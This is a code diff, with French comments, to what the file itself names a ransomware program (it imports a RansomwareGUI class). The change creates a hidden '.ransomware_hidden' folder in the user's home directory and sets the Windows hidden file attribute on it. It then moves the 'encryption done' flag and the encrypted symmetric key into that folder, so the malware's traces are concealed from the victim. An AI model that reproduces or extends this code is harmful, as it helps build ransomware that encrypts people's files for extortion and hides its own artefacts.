@@ -2,6 +2,8 @@ import tkinter as tk
 from gui import RansomwareGUI
 import os
 import sys
+import stat
+import ctypes
 # Ajouter le répertoire parent au chemin de recherche des modules
 parent_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
 sys.path.append(parent_dir)
@@ -11,7 +13,20 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend
 
-ENCRYPTION_FLAG = "encryption_done.flag"
+# Chemin du dossier caché dans le répertoire de l'utilisateur
+hidden_dir = os.path.join(os.path.expanduser("~"), ".ransomware_hidden")
+if not os.path.exists(hidden_dir):
+    os.makedirs(hidden_dir)
+
+    # Définir l'attribut caché sous Windows
+    if os.name == 'nt':  # Vérifie si le système d'exploitation est Windows
+        FILE_ATTRIBUTE_HIDDEN = 0x02
+        ret = ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, FILE_ATTRIBUTE_HIDDEN)
+        if not ret:
+            raise ctypes.WinError()
+
+ENCRYPTION_FLAG =  os.path.join(hidden_dir, "encryption_done.flag")
+KEY_FILE = os.path.join(hidden_dir, "keys", "encrypted_symmetric_key.bin")
 
 def is_already_encrypted():
     # Vérifie si le chiffrement a déjà été effectué.
@@ -56,15 +71,12 @@ def main():
         )
 
         # Créer le répertoire 'keys' s'il n'existe pas dans le répertoire courant
-        keys_dir = 'keys'
+        keys_dir = os.path.join(hidden_dir, 'keys')
         if not os.path.exists(keys_dir):
             os.makedirs(keys_dir)
 
-        # Construire le chemin pour la clé symétrique chiffrée dans le répertoire courant
-        encrypted_symmetric_key_path = os.path.join(keys_dir, 'encrypted_symmetric_key.bin')
-
         # Sauvegarder la clé symétrique chiffrée
-        with open(encrypted_symmetric_key_path, 'wb') as key_file:
+        with open(KEY_FILE, 'wb') as key_file:
             key_file.write(encrypted_symmetric_key)
 
         mark_as_encrypted()
